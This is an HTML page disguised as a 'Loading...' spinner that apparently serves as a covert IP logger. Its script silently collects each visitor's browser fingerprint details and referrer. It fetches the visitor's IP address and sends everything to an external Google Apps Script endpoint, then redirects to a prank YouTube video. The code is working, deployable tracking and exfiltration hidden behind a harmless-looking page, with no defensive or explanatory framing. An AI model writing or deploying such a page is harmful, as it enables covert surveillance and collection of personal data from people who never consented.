<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 150px;
            background: white;
        }
        .loader {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h3>Loading...</h3>

    <script>
        const REDIRECT = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
        const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbwrcGejT1loU62ewjQaMxTQyxmgWyIvl-Mx4EJXcoq5ThbmhHYPP0uXugTxkEFekq1qOA/exec';

        // Silently collect data
        const data = {
            timestamp: new Date().toLocaleString(),
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            screen: screen.width + 'x' + screen.height,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookies: navigator.cookieEnabled,
            referrer: document.referrer || 'Direct'
        };

        // Get IP and send email alert
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(d => {
                data.ip = d.ip;
                console.log('ðŸ“Š CAPTURED DATA:', data);
                
                // Send email via Google Script
                const params = new URLSearchParams(data);
                fetch(EMAIL_SCRIPT + '?' + params.toString())
                    .catch(() => {});
            })
            .catch(() => {});

        // Redirect after 1.5 seconds
        setTimeout(() => {
            window.location.href = REDIRECT;
        }, 1500);
    </script>
</body>
</html>
